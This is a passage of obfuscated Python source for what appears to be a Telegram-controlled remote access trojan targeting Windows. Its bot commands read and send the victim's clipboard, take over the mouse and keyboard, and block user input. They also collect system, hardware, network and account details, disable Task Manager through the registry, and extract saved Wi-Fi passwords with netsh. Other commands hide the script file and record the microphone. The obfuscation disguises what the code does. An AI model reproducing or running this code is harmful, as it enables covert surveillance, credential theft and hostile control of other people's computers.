		O0OO0OOOOOO00OOOO =1 ;O0OO0OO0O000O0OOO =I .windll .kernel32 ;O0OO0OO0O000O0OOO .GlobalLock .argtypes =[I .c_void_p ];O0OO0OO0O000O0OOO .GlobalLock .restype =I .c_void_p ;O0OO0OO0O000O0OOO .GlobalUnlock .argtypes =[I .c_void_p ];OO0O0O00O0OO0OOOO =I .windll .user32 ;OO0O0O00O0OO0OOOO .GetClipboardData .restype =I .c_void_p ;OO0O0O00O0OO0OOOO .OpenClipboard (0 )#line:343
		if OO0O0O00O0OO0OOOO .IsClipboardFormatAvailable (O0OO0OOOOOO00OOOO ):O000O00OO00OOOO0O =OO0O0O00O0OO0OOOO .GetClipboardData (O0OO0OOOOOO00OOOO );OOOOOOO00000O00O0 =O0OO0OO0O000O0OOO .GlobalLock (O000O00OO00OOOO0O );OO000O0O000O0OO00 =I .c_char_p (OOOOOOO00000O00O0 );O00O00O0OO00O0O00 =OO000O0O000O0OO00 .value ;O0OO0OO0O000O0OOO .GlobalUnlock (OOOOOOO00000O00O0 );OOOO000O0O0OOOOO0 =O00O00O0OO00O0O00 .decode ();OO0O0O00O0OO0OOOO .CloseClipboard ();O000OOO00000OO0OO =B .getlogin ();A .send_message (OOO0O0O0O0OOO00O0 .chat .id ,f"{O000OOO00000OO0OO} 's clipboard is:  {OOOO000O0O0OOOOO0}")#line:344
global l #line:345
l =42 #line:346
@A .message_handler (commands =['mousestop'])#line:347
def D9 (O0OOOOO0O0O0O0OO0 ):global l ;l =7 ;A .send_message (O0OOOOO0O0O0O0OO0 .chat .id ,'mouse kill has stopped!')#line:348
@A .message_handler (commands =['mousekill'])#line:349
def Cl (O0O000OOOO0O00O0O ):#line:350
	O00O00O0O0OOOOOO0 =O0O000OOOO0O00O0O #line:351
	try :#line:352
		A .send_message (O00O00O0O0OOOOOO0 .chat .id ,'mouse kill has started!')#line:353
		while l !=7 :D .moveTo (500 ,500 )#line:354
	except C as OOO0O0OOO0O0O000O :A .send_message (O00O00O0O0OOOOOO0 .chat .id ,f"Error{OOO0O0OOO0O0O000O}")#line:355
global m #line:356
m =42 #line:357
@A .message_handler (commands =['mousemesstop'])#line:358
def DA (OO000OOO0OOO0OO00 ):global m ;m =7 ;A .send_message (OO000OOO0OOO0OO00 .chat .id ,'mouse mess has stopped!')#line:359
@A .message_handler (commands =['mousemesstart'])#line:360
def Cl (O00000000OOOO0O00 ):#line:361
	OO0000O0OOOO00O00 =O00000000OOOO0O00 #line:362
	try :#line:363
		A .send_message (OO0000O0OOOO00O00 .chat .id ,'mouse mess has started!')#line:364
		while m !=7 :OOO000OO00O00OO0O =Bl .randint (666 ,999 );O00O0OO0OO0O0OOO0 =Bl .randint (666 ,999 );D .moveTo (OOO000OO00O00OO0O ,O00O0OO0OO0O0OOO0 ,7 );R .sleep (1 )#line:365
	except C as O000O0O0O000O00OO :A .send_message (OO0000O0OOOO00O00 .chat .id ,f"Error{O000O0O0O000O00OO}")#line:366
@A .message_handler (commands =['keytype'])#line:367
def DB (O000000O0O0OO00O0 ):#line:368
	O0000000OO00000OO =O000000O0O0OO00O0 #line:369
	try :O0O0O00O000OOO00O =O0000000OO00000OO .text .split ('/keytype',1 )[1 ].strip ();D .write (O0O0O00O000OOO00O )#line:370
	except C as OOOO000000O0OO00O :A .send_message (O0000000OO00000OO .chat .id ,f"Error{OOOO000000O0OO00O}")#line:371
@A .message_handler (commands =['mousemove'])#line:372
def Cm (OO000O0O0OOO00OOO ):#line:373
	OO0OOOO00O0OOOO0O =OO000O0O0OOO00OOO #line:374
	try :O00OOOOOO000OOOOO =OO0OOOO00O0OOOO0O .text .split ('/mousemove',1 )[1 ].strip ().split ();OOO0OOOOO00000OO0 =O (O00OOOOOO000OOOOO [0 ]);O00O0OOOOOOOOOO0O =O (O00OOOOOO000OOOOO [1 ]);D .moveTo (OOO0OOOOO00000OO0 ,O00O0OOOOOOOOOO0O );A .send_message (OO0OOOO00O0OOOO0O .chat .id ,f"Mouse pointer moved to {OOO0OOOOO00000OO0} and {O00O0OOOOOOOOOO0O} cordinates successfully!")#line:375
	except C as O00OOO0O0O0O000OO :A .send_message (OO0OOOO00O0OOOO0O .chat .id ,f"Error{O00OOO0O0O0O000OO}")#line:376
@A .message_handler (commands =['mouseclick'])#line:377
def Cm (O0O0OOO00O0OO0O00 ):#line:378
	OO00O00O0O0OO0O0O =O0O0OOO00O0OO0O00 #line:379
	try :D .click ();A .send_message (OO00O00O0O0OO0O0O .chat .id ,'Mouse clicked!')#line:380
	except C as O00OOO00000O0OO0O :A .send_message (OO00O00O0O0OO0O0O .chat .id ,f"Error{O00OOO00000O0OO0O}")#line:381
@A .message_handler (commands =['keypress'])#line:382
def Bt (OOOOOO0OO0OO00000 ):#line:383
	OOOOOOO000O0O0000 =OOOOOO0OO0OO00000 ;OOO0000OOOOO000OO =['!','"','#','$','%','&',"'",'(',')','*','+',',',p ,'.',q ,'0','1','2','3','4','5','6','7','8','9',r ,';','<',b ,'>','?','@','[',c ,']','^','_','`','a','b','c','d',s ,'f','g','h','i','j','k','l','m','n','o','p','q',o ,'s','t','u','v',P ,'x','y','z','{','|','}','~',A6 ,A7 ,d ,A8 ,A9 ,t ,AA ,AB ,AC ,AD ,AE ,AF ,AG ,AH ,AI ,AJ ,AK ,u ,AL ,AM ,AN ,AO ,AP ,AQ ,e ,AR ,AS ,AT ,AU ,v ,'f1',AV ,AW ,AX ,AY ,AZ ,Aa ,Ab ,Ac ,Ad ,Ae ,'f2',Af ,Ag ,Ah ,Ai ,Aj ,'f3',w ,'f5','f6','f7','f8','f9',Ak ,'fn',Al ,Am ,An ,x ,Ao ,Ap ,Aq ,Ar ,As ,At ,Au ,Av ,Aw ,y ,Ax ,Ay ,Az ,A_ ,B0 ,B1 ,B2 ,B3 ,B4 ,B5 ,B6 ,B7 ,B8 ,B9 ,BA ,BB ,BC ,BD ,BE ,BF ,BG ,BH ,BI ,BJ ,BK ,BL ,BM ,BN ,z ,BO ,BP ,BQ ,BR ,BS ,BT ,A0 ,BU ,BV ,BW ,BX ,f ,Q ,BY ,N ,g ,BZ ,Ba ,Bb ,Bc ,Bd ,Be ,Bf ]#line:384
	try :A .send_message (OOOOOOO000O0O0000 .chat .id ,'(/keypress win) You can use this keys:');A .send_message (OOOOOOO000O0O0000 .chat .id ,E (OOO0000OOOOO000OO ));OOOO00OO00OO00O0O =OOOOOOO000O0O0000 .text .split ('/keypress',1 )[1 ].strip ();D .press (OOOO00OO00OO00O0O );A .send_message (OOOOOOO000O0O0000 .chat .id ,f"'{OOOO00OO00OO00O0O}'  key has pressed successfully!")#line:385
	except C as OOOO00OOOO0OOOOOO :A .send_message (OOOOOOO000O0O0000 .chat .id ,f"Error: {OOOO00OOOO0OOOOOO}")#line:386
@A .message_handler (commands =['keypresstwo'])#line:387
def Bt (OO0OOOO000OO0O000 ):#line:388
	O00000000000O000O =OO0OOOO000OO0O000 ;O0O0O000O000O0O00 =['!','"','#','$','%','&',"'",'(',')','*','+',',',p ,'.',q ,'0','1','2','3','4','5','6','7','8','9',r ,';','<',b ,'>','?','@','[',c ,']','^','_','`','a','b','c','d',s ,'f','g','h','i','j','k','l','m','n','o','p','q',o ,'s','t','u','v',P ,'x','y','z','{','|','}','~',A6 ,A7 ,d ,A8 ,A9 ,t ,AA ,AB ,AC ,AD ,AE ,AF ,AG ,AH ,AI ,AJ ,AK ,u ,AL ,AM ,AN ,AO ,AP ,AQ ,e ,AR ,AS ,AT ,AU ,v ,'f1',AV ,AW ,AX ,AY ,AZ ,Aa ,Ab ,Ac ,Ad ,Ae ,'f2',Af ,Ag ,Ah ,Ai ,Aj ,'f3',w ,'f5','f6','f7','f8','f9',Ak ,'fn',Al ,Am ,An ,x ,Ao ,Ap ,Aq ,Ar ,As ,At ,Au ,Av ,Aw ,y ,Ax ,Ay ,Az ,A_ ,B0 ,B1 ,B2 ,B3 ,B4 ,B5 ,B6 ,B7 ,B8 ,B9 ,BA ,BB ,BC ,BD ,BE ,BF ,BG ,BH ,BI ,BJ ,BK ,BL ,BM ,BN ,z ,BO ,BP ,BQ ,BR ,BS ,BT ,A0 ,BU ,BV ,BW ,BX ,f ,Q ,BY ,N ,g ,BZ ,Ba ,Bb ,Bc ,Bd ,Be ,Bf ]#line:389
	try :A .send_message (O00000000000O000O .chat .id ,'(/keypresstwo win r) You can use this keys:');A .send_message (O00000000000O000O .chat .id ,E (O0O0O000O000O0O00 ));O0O0OO0OO00OO000O =O00000000000O000O .text .split ('/keypresstwo',1 )[1 ].strip ().split ();OO0O00OOO0OO000O0 =O0O0OO0OO00OO000O [0 ];OOOO0OOO00OO0OO00 =O0O0OO0OO00OO000O [1 ];D .hotkey (OO0O00OOO0OO000O0 ,OOOO0OOO00OO0OO00 );A .send_message (O00000000000O000O .chat .id ,f"key has pressed successfully!")#line:390
	except C as OOO00000000OO0000 :A .send_message (O00000000000O000O .chat .id ,f"Error: {OOO00000000OO0000}")#line:391
@A .message_handler (commands =['keypressthree'])#line:392
def Bt (OOOOO000O000OO0O0 ):#line:393
	O0000O0OOOO0OOOO0 =OOOOO000O000OO0O0 ;O0O00O0OOO0OO0000 =['!','"','#','$','%','&',"'",'(',')','*','+',',',p ,'.',q ,'0','1','2','3','4','5','6','7','8','9',r ,';','<',b ,'>','?','@','[',c ,']','^','_','`','a','b','c','d',s ,'f','g','h','i','j','k','l','m','n','o','p','q',o ,'s','t','u','v',P ,'x','y','z','{','|','}','~',A6 ,A7 ,d ,A8 ,A9 ,t ,AA ,AB ,AC ,AD ,AE ,AF ,AG ,AH ,AI ,AJ ,AK ,u ,AL ,AM ,AN ,AO ,AP ,AQ ,e ,AR ,AS ,AT ,AU ,v ,'f1',AV ,AW ,AX ,AY ,AZ ,Aa ,Ab ,Ac ,Ad ,Ae ,'f2',Af ,Ag ,Ah ,Ai ,Aj ,'f3',w ,'f5','f6','f7','f8','f9',Ak ,'fn',Al ,Am ,An ,x ,Ao ,Ap ,Aq ,Ar ,As ,At ,Au ,Av ,Aw ,y ,Ax ,Ay ,Az ,A_ ,B0 ,B1 ,B2 ,B3 ,B4 ,B5 ,B6 ,B7 ,B8 ,B9 ,BA ,BB ,BC ,BD ,BE ,BF ,BG ,BH ,BI ,BJ ,BK ,BL ,BM ,BN ,z ,BO ,BP ,BQ ,BR ,BS ,BT ,A0 ,BU ,BV ,BW ,BX ,f ,Q ,BY ,N ,g ,BZ ,Ba ,Bb ,Bc ,Bd ,Be ,Bf ]#line:394
	try :A .send_message (O0000O0OOOO0OOOO0 .chat .id ,'(/keypressthree ctrl alt esc) You can use this keys:');A .send_message (O0000O0OOOO0OOOO0 .chat .id ,E (O0O00O0OOO0OO0000 ));OO0000OOOOO0OOOO0 =O0000O0OOOO0OOOO0 .text .split ('/keypressthree',1 )[1 ].strip ().split ();O0OOO0O0000O0000O =OO0000OOOOO0OOOO0 [0 ];O0O00000000O00O00 =OO0000OOOOO0OOOO0 [1 ];O0OO000O0OOO00OOO =OO0000OOOOO0OOOO0 [2 ];D .hotkey (O0OOO0O0000O0000O ,O0O00000000O00O00 ,O0OO000O0OOO00OOO );A .send_message (O0000O0OOOO0OOOO0 .chat .id ,f"key has pressed successfully!")#line:395
	except C as O0O000OOO0O00OO00 :A .send_message (O0000O0OOOO0OOOO0 .chat .id ,f"Error: {O0O000OOO0O00OO00}")#line:396
@A .message_handler (commands =[t ])#line:397
def DC (O00OOO00O0OO00OOO ):#line:398
	O000OO0OOO0OOO000 =O00OOO00O0OO00OOO #line:399
	try :#line:400
		O0O00OO0O0O0O0OO0 =B .popen ('wmic product get Name, Version , Vendor').read ().strip ();O0OOO0O00O0OOO00O =O0O00OO0O0O0O0OO0 .splitlines ();OOOOO0OO0O0O0OOOO =30 ;O0OOO000000OO0OO0 =[O0OOO0O00O0OOO00O [O0O00OOOO0OOOOOOO :O0O00OOOO0OOOOOOO +OOOOO0OO0O0O0OOOO ]for O0O00OOOO0OOOOOOO in V (0 ,G (O0OOO0O00O0OOO00O ),OOOOO0OO0O0O0OOOO )]#line:401
		for O00O0O0O000000OOO in O0OOO000000OO0OO0 :A .send_message (O000OO0OOO0OOO000 .chat .id ,h .join (O00O0O0O000000OOO ).strip ())#line:402
	except C as OO0000O0OOOOO0OOO :A .send_message (O000OO0OOO0OOO000 .chat .id ,f"Error: {OO0000O0OOOOO0OOO}")#line:403
@A .message_handler (commands =['pcinfo'])#line:404
def DD (OOO00000000OOO00O ):#line:405
	OOO0OOO0O0OOO000O ='wmic computersystem list brief';O000O0000000O0000 =OOO00000000OOO00O #line:406
	try :#line:407
		OO00O0000OO0OOOOO =B .popen (OOO0OOO0O0OOO000O ).read ().strip ();OOO0O0OO0OO0O0OOO =B .popen (OOO0OOO0O0OOO000O ).read ().strip ();OO000O0OOOO00000O =B .popen ('wmic bios get Manufacturer, Version, ReleaseDate, SerialNumber, SMBIOSBIOSVersion').read ().strip ();O0OO000OO0OOO00O0 =B .popen ('wmic cpu get Name, NumberOfCores, NumberOfLogicalProcessors, MaxClockSpeed, Manufacturer, Caption').read ().strip ();O0O00OO0OO0O000O0 =B .popen ('wmic memorychip get Capacity, Manufacturer, MemoryType, Speed, PartNumber, DeviceLocator').read ().strip ();O0O0OOOO000000OO0 =B .popen ('wmic diskdrive get Model, Size, SerialNumber, MediaType, InterfaceType, Status').read ().strip ();O0O0OOO0OOO000OO0 =B .popen ('wmic computersystem get Model, Manufacturer, TotalPhysicalMemory, Domain, Username, SystemType, NumberOfProcessors').read ().strip ();OO0O0000OOO0OO000 =B .popen ('wmic os get Caption, Version, OSArchitecture, BuildNumber, RegisteredUser, SerialNumber, InstallDate').read ().strip ();O0O0000O0OO00OOO0 =B .popen ('wmic nicconfig get Description, MACAddress, IPAddress, DefaultIPGateway, DNSHostName, ServiceName').read ().strip ();O0000000O000OO00O =B .popen ('wmic os get /format:list').read ().strip ()#line:408
		def O000O00OOOO0OOOOO (O0O0OOOOO0O000OO0 ,O0000O000OO0OO0OO ,OO0O0000O00O000O0 ):#line:409
			OOOO0O0OOO0OOOOO0 =OO0O0000O00O000O0 .splitlines ();OO000OO0O0O00OO0O =30 ;OO0OO0O000OO00O00 =[OOOO0O0OOO0OOOOO0 [OOO00O00OOOO00OOO :OOO00O00OOOO00OOO +OO000OO0O0O00OO0O ]for OOO00O00OOOO00OOO in V (0 ,G (OOOO0O0OOO0OOOOO0 ),OO000OO0O0O00OO0O )]#line:410
			for (O00OO000O000OO0O0 ,OOOOOOOO0O0OO0000 )in A5 (OO0OO0O000OO00O00 ):A .send_message (O0O0OOOOO0O000OO0 ,f"{O0000O000OO0OO0OO} (part {O00OO000O000OO0O0+1}):\n"+h .join (OOOOOOOO0O0OO0000 ))#line:411
		O000O00OOOO0OOOOO (O000O0000000O0000 .chat .id ,'PC Properties',OO00O0000OO0OOOOO );O000O00OOOO0OOOOO (O000O0000000O0000 .chat .id ,'PC OS Version',OOO0O0OO0OO0O0OOO );O000O00OOOO0OOOOO (O000O0000000O0000 .chat .id ,'PC BIOS',OO000O0OOOO00000O );O000O00OOOO0OOOOO (O000O0000000O0000 .chat .id ,'CPU Info',O0OO000OO0OOO00O0 );O000O00OOOO0OOOOO (O000O0000000O0000 .chat .id ,'RAM Info',O0O00OO0OO0O000O0 );O000O00OOOO0OOOOO (O000O0000000O0000 .chat .id ,'Computer Info',O0O0OOO0OOO000OO0 );O000O00OOOO0OOOOO (O000O0000000O0000 .chat .id ,'Disk Drive Info',O0O0OOOO000000OO0 );O000O00OOOO0OOOOO (O000O0000000O0000 .chat .id ,'OS Info',OO0O0000OOO0OO000 );O000O00OOOO0OOOOO (O000O0000000O0000 .chat .id ,'Network Adapter Info',O0O0000O0OO00OOO0 );A .send_message (O000O0000000O0000 .chat .id ,f"System Info: {O0000000O000OO00O}")#line:412
	except C as O00O0O00OOO0OO0O0 :A .send_message (O000O0000000O0000 .chat .id ,f"Error: {O00O0O00OOO0OO0O0}")#line:413
@A .message_handler (commands =['batteryinfo'])#line:414
def DE (OOO0OOO0O0000O0O0 ):#line:415
	O0OOOO0OOO00000O0 =OOO0OOO0O0000O0O0 #line:416
	try :OO0O0OO0000000O00 =B .popen ('wmic path Win32_Battery get BatteryStatus').read ().strip ();OOOOO00OO0000OO00 =B .popen ('wmic path Win32_Battery get EstimatedChargeRemaining').read ().strip ();O0000OO0OOO000OO0 =B .popen ('wmic path Win32_Battery get name').read ().strip ();O0OOOOOOO0O0O0000 =B .popen ('wmic path Win32_Battery get SystemName').read ().strip ();A .send_message (O0OOOO0OOO00000O0 .chat .id ,'In BatteryStatus. each number represents a specific battery state.\n                                Here are the meanings:\n                         \n                         1 - The battery is discharging\n                         2 - The battery is charging\n                         3 - The battery is fully charged\n                         4 - The battery charge is low\n                         5 - The battery charge is critical\n                         6 - The battery is charging and will soon be fully.\n                         7 - Charge is zero');A .send_message (O0OOOO0OOO00000O0 .chat .id ,f"Battery status: {OO0O0OO0000000O00}");A .send_message (O0OOOO0OOO00000O0 .chat .id ,f"Battery System name: {O0OOOOOOO0O0O0000}");A .send_message (O0OOOO0OOO00000O0 .chat .id ,f"Battery name: {O0000OO0OOO000OO0}");A .send_message (O0OOOO0OOO00000O0 .chat .id ,f"Battery {OOOOO00OO0000OO00}%")#line:417
	except C as OO0O000O0000OOOO0 :A .send_message (O0OOOO0OOO00000O0 .chat .id ,f"Error: {OO0O000O0000OOOO0}")#line:418
@A .message_handler (commands =['shortinfo'])#line:419
def DF (O0OOOO00O00O0O0O0 ):#line:420
	OO00000000O00OO0O ='Not available';O00OOO000OO0O0OO0 ='Unknown';O0O00O00OOOOO0O00 =O0OOOO00O00O0O0O0 #line:421
	try :#line:422
		A .send_message (O0O00O00OOOOO0O00 .chat .id ,Bg );O000O00O0O0O000OO =B .getenv ('COMPUTERNAME',O00OOO000OO0O0OO0 );O0O0OOO000OOO000O =B .popen ('ver').read ().strip ()#line:423
		try :O0OOO00O000O0OOO0 =B .popen ('wmic os get version').read ().splitlines ()[2 ].strip ()#line:424
		except Bv :O0OOO00O000O0OOO0 =O00OOO000OO0O0OO0 #line:425
		try :O00OOO00OO00O0O00 =B .popen ('wmic cpu get Name').read ().splitlines ()[2 ].strip ()#line:426
		except Bv :O00OOO00OO00O0O00 =O00OOO000OO0O0OO0 #line:427
		O0O0000OOO0O0OO00 =B .cpu_count ()#line:428
		if B .name =='nt':O0O0000000O000OOO =B .popen ('wmic computersystem get TotalPhysicalMemory').read ().splitlines ()[2 ].strip ();O0O0000000O000OOO =f"{O(O0O0000000O000OOO)//1024**2} MB"if O0O0000000O000OOO .isdigit ()else OO00000000O00OO0O #line:429
		else :O0O0000000O000OOO =OO00000000O00OO0O #line:430
		O0O0O000O0000OO0O =B .popen ('systeminfo | find "System Boot Time"').read ().strip ()#line:431
		if O0O0O000O0000OO0O :OO000OO0OO000O0OO =O0O0O000O0000OO0O .split (r )[1 ].strip ()#line:432
		else :OO000OO0OO000O0OO =OO00000000O00OO0O #line:433
		OOO0000O00O0000O0 ={'System':O0O0OOO000OOO000O ,'Host name':O000O00O0O0O000OO ,'OS version':O0OOO00O000O0OOO0 ,'CPU':O00OOO00OO00O0O00 ,'Core count':O0O0000OOO0O0OO00 ,'RAM':O0O0000000O000OOO ,'Boot time':OO000OO0OO000O0OO };OO0OO00OOO0OOOOOO =h .join ([f"{OOOOO0000O000O000}: {OOOO00OOO0000OO0O}"for (OOOOO0000O000O000 ,OOOO00OOO0000OO0O )in OOO0000O00O0000O0 .items ()]);A .send_message (O0O00O00OOOOO0O00 .chat .id ,OO0OO00OOO0OOOOOO )#line:434
	except C as O0OOO00O0O0O0O0O0 :A .send_message (O0O00O00OOOOO0O00 .chat .id ,f"Error: {O0OOO00O0O0O0O0O0}")#line:435
@A .message_handler (commands =['disabletaskmgr'])#line:436
def Cn (O0OO00O0000O0O0O0 ):#line:437
	O0O0OO0OO00O00OO0 =O0OO00O0000O0O0O0 #line:438
	try :OOO00OOOO0O0O0000 ='reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v DisableTaskMgr /t REG_DWORD /d 1 /f';B .popen (OOO00OOOO0O0O0000 );A .send_message (O0O0OO0OO00O00OO0 .chat .id ,'taskmanager disabled!')#line:439
	except C as OO000O00000000OO0 :A .send_message (O0O0OO0OO00O00OO0 .chat .id ,f"Error: {OO000O00000000OO0}")#line:440
@A .message_handler (commands =['block'])#line:441
def DG (O0OO0O00OO00O000O ):#line:442
	O0O000O00OOOOOO00 =O0OO0O00OO00O000O #line:443
	try :I .windll .user32 .BlockInput (J );A .send_message (O0O000O00OOOOOO00 .chat .id ,"User's input (mouse and keyboard) successfully blocked!")#line:444
	except C as OOO0O00O00OO000OO :A .send_message (O0O000O00OOOOOO00 .chat .id ,f"Error: {OOO0O00O00OO000OO}")#line:445
@A .message_handler (commands =['unblock'])#line:446
def DH (OO000O0O0OO00O0OO ):#line:447
	O0OOOO00O0OO00OO0 =OO000O0O0OO00O0OO #line:448
	try :I .windll .user32 .BlockInput (L );A .send_message (O0OOOO00O0OO00OO0 .chat .id ,"User's input (mouse and keyboard) successfully unblocked!");A .send_message (O0OOOO00O0OO00OO0 .chat .id ,"If it's not unblocked run again: \n/unblock")#line:449
	except C as O0OOO0O0OOO0O000O :A .send_message (O0OOOO00O0OO00OO0 .chat .id ,f"Error: {O0OOO0O0OOO0O000O}")#line:450
@A .message_handler (commands =['enabletaskmgr'])#line:451
def Cn (OOOOO0O00OO0O0O0O ):#line:452
	O0O00O00O0OOO00OO =OOOOO0O00OO0O0O0O #line:453
	try :OOOO0OO00000OO00O ='reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v DisableTaskMgr /t REG_DWORD /d 0 /f';B .popen (OOOO0OO00000OO00O );A .send_message (O0O00O00O0OOO00OO .chat .id ,'taskmanager enabled!')#line:454
	except C as O0O0OOO0O0O00O00O :A .send_message (O0O00O00O0OOO00OO .chat .id ,f"Error: {O0O0OOO0O0O00O00O}")#line:455
@A .message_handler (commands =['wifilist'])#line:456
def Co (O000O0O0OOO0O00OO ):OO0OO0OOOOO0O0O00 =B .popen ('netsh wlan show profile').read ().strip ();A .send_message (O000O0O0OOO0O00OO .chat .id ,f"Wifi networks📶:{OO0OO0OOOOO0O0O00}")#line:457
@A .message_handler (commands =['wifipass'])#line:458
def Co (OO000O0OOOOOO0OOO ):#line:459
	O0O0OO000OO0O0000 =OO000O0OOOOOO0OOO ;OO0OOO0O00000000O =O0O0OO000OO0O0000 .text .split ('/wifipass',1 )[1 ].strip ();O0O0OO0000OOOO0O0 =B .popen (f"netsh wlan show profile name={OO0OOO0O00000000O} key=clear").read ().strip ()#line:460
	try :A .send_message (O0O0OO000OO0O0000 .chat .id ,E (O0O0OO0000OOOO0O0 ))#line:461
	except C as OO00O0O0O00O0OOO0 :A .send_message (O0O0OO000OO0O0000 .chat .id ,f"Error: {OO00O0O0O00O0OOO0}")#line:462
@A .message_handler (commands =['rotate'])#line:463
def DI (OOOO00O0000OO0O00 ):O000O0O0O000000O0 =0 ;O000O0O0O000000O0 =(O000O0O0O000000O0 +90 )%360 ;D .hotkey (u ,d ,{0 :f ,90 :z ,180 :e ,270 :y }[O000O0O0O000000O0 ]);A .send_message (OOOO00O0000OO0O00 .chat .id ,f"rotated +{O000O0O0O000000O0} degrees")#line:464
@A .message_handler (commands =['users'])#line:465
def DJ (OO0OOOO0O0OOO0O0O ):#line:466
	O0OOOOOO0OOOO000O =OO0OOOO0O0OOO0O0O #line:467
	try :#line:468
		OO0O0OOO0OOO0OOO0 =B .popen ('net user').read ().strip ();OOOOO00O0O00OOO00 =OO0O0OOO0OOO0OOO0 .splitlines ();OOO000O0OO0OOOOO0 =h .join (OOOOO00O0O00OOO00 );A .send_message (O0OOOOOO0OOOO000O .chat .id ,f"Res:\n{OOO000O0OO0OOOOO0}");A .send_message (O0OOOOOO0OOOO000O .chat .id ,'####################################');O000OOOOOO0000O00 =B .popen ('wmic useraccount list brief').read ().strip ();O0OO00O0000000OOO =O000OOOOOO0000O00 .splitlines ();OOOO0OO00OOO0O00O =O0OO00O0000000OOO [0 ].split ();O0O0OOOOO0OO00OO0 =[OO0O0000OOOO00000 .split (maxsplit =G (OOOO0OO00OOO0O00O )-1 )for OO0O0000OOOO00000 in O0OO00O0000000OOO [1 :]];OO00O0OO0O0O00OO0 =[G (O00O0000O0O00000O )for O00O0000O0O00000O in OOOO0OO00OOO0O00O ]#line:469
		for O00OO0O0OOO0OO00O in O0O0OOOOO0OO00OO0 :#line:470
			for (O00OOOOOOO0OOO0OO ,O00OOOO000OO0OOO0 )in A5 (O00OO0O0OOO0OO00O ):OO00O0OO0O0O00OO0 [O00OOOOOOO0OOO0OO ]=max (OO00O0OO0O0O00OO0 [O00OOOOOOO0OOO0OO ],G (O00OOOO000OO0OOO0 ))#line:471
		def OOO000O0000OOO000 (OO00OOO00OOOO0OOO ):return ' | '.join (OOOO0OOO00O0O0OO0 .ljust (OO00O0OO0O0O00OO0 [OOO0O0O00O0OOO0O0 ])for (OOO0O0O00O0OOO0O0 ,OOOO0OOO00O0O0OO0 )in A5 (OO00OOO00OOOO0OOO ))#line:472
		O0O0OO000OOOO000O =OOO000O0000OOO000 (OOOO0OO00OOO0O00O );O0O00OO000000000O ='-+-'.join (p *OO000OOOO0OOO0O0O for OO000OOOO0OOO0O0O in OO00O0OO0O0O00OO0 );O0000O0O0O0OOO0O0 =[O0O0OO000OOOO000O ,O0O00OO000000000O ]+[OOO000O0000OOO000 (OOO00O0OOOOOO00OO )for OOO00O0OOOOOO00OO in O0O0OOOOO0OO00OO0 ];OOO000O0OO000O00O =h .join (O0000O0O0O0OOO0O0 );A .send_message (O0OOOOOO0OOOO000O .chat .id ,f"Also:\n{OOO000O0OO000O00O}")#line:473
	except C as OOO000O00000O00OO :A .send_message (O0OOOOOO0OOOO000O .chat .id ,f"Error: {OOO000O00000O00OO}")#line:474
@A .message_handler (commands =['hide'])#line:475
def DK (OOO0OOOO0OO0O00O0 ):#line:476
	OO0OOOOOO0OO00000 =OOO0OOOO0OO0O00O0 #line:477
	try :O0OOOO0OO00O00OOO =B .getcwd ();OO0O00000OO0O0OO0 =B .path .basename (__file__ );O0OO00O0OO0000O00 =O0OOOO0OO00O00OOO +c +OO0O00000OO0O0OO0 ;A .send_message (OO0OOOOOO0OO00000 .chat .id ,f"Full path:{O0OO00O0OO0000O00}");B .popen (f'attrib +h "{O0OO00O0OO0000O00}"');A .send_message (OO0OOOOOO0OO00000 .chat .id ,f"your app is hidden!")#line:478
	except C as OO0O0O00000OO00O0 :A .send_message (OO0OOOOOO0OO00000 .chat .id ,f"Error:{OO0O0O00000OO00O0}")#line:479
@A .message_handler (commands =['unhide'])#line:480
def DL (OO00O000O0O0OO0OO ):#line:481
	O0OO0OOOO00O00OOO =OO00O000O0O0OO0OO #line:482
	try :O0OO00OOO0O0O0000 =B .getcwd ();O00O00OO00O0000O0 =B .path .basename (__file__ );OOOOOO0O0OOO00OOO =O0OO00OOO0O0O0000 +c +O00O00OO00O0000O0 ;A .send_message (O0OO0OOOO00O00OOO .chat .id ,f"Full path:{OOOOOO0O0OOO00OOO}");B .popen (f'attrib -h "{OOOOOO0O0OOO00OOO}"');A .send_message (O0OO0OOOO00O00OOO .chat .id ,f"your app is unhidden!")#line:483
	except C as O00000O0OOOOOO0O0 :A .send_message (O0OO0OOOO00O00OOO .chat .id ,f"Error:{O00000O0OOOOOO0O0}")#line:484
@A .message_handler (commands =['mic'])#line:485
def DM (O0OOO00OOOOO00O00 ):#line:486
	O00000OOO0OOOO0OO =O0OOO00OOOOO00O00 #line:487
	if G (O00000OOO0OOOO0OO .text .split ())>1 :#line:488
		try :O0O0O000OOOO0OO0O =O (O00000OOO0OOOO0OO .text .split ()[1 ])#line:489
		except ValueError :A .reply_to (O00000OOO0OOOO0OO ,'Invalid record time. Please enter a valid number.');return #line:490
	else :O0O0O000OOOO0OO0O =5 #line:491
	O00000O0000OO000O =1024 ;O0000O0O000000OO0 =Bn .paInt16 ;OO000000OO00O0O0O =2 ;OOO00O0O0000OO000 =44100 ;OO0OOO0OOO000000O ='6425s-3erq-eq44-vcx7.wav';O000OO000000O00O0 =Bn .PyAudio ();OOO0O00O0O0OOOOOO =O000OO000000O00O0 .open (format =O0000O0O000000OO0 ,channels =OO000000OO00O0O0O ,rate =OOO00O0O0000OO000 ,input =J ,frames_per_buffer =O00000O0000OO000O );A .send_message (O00000OOO0OOOO0OO .chat .id ,f"Recording audio for {O0O0O000OOOO0OO0O} seconds...");O0OO00OO0O0OO0O0O =[]#line:492
	for OOOO0O00OOO0OO0O0 in V (0 ,O (OOO00O0O0000OO000 /O00000O0000OO000O *O0O0O000OOOO0OO0O )):OOOOO0OO0O00000O0 =OOO0O00O0O0OOOOOO .read (O00000O0000OO000O );O0OO00OO0O0OO0O0O .append (OOOOO0OO0O00000O0 )#line:493
	A .send_message (O00000OOO0OOOO0OO .chat .id ,'Done recording');OOO0O00O0O0OOOOOO .stop_stream ();OOO0O00O0O0OOOOOO .close ();O000OO000000O00O0 .terminate ()#line:494
	with wave .open (OO0OOO0OOO000000O ,'wb')as OO00000O0OOO00OOO :OO00000O0OOO00OOO .setnchannels (OO000000OO00O0O0O );OO00000O0OOO00OOO .setsampwidth (O000OO000000O00O0 .get_sample_size (O0000O0O000000OO0 ));OO00000O0OOO00OOO .setframerate (OOO00O0O0000OO000 );OO00000O0OOO00OOO .writeframes (b''.join (O0OO00OO0O0OO0O0O ))#line:495
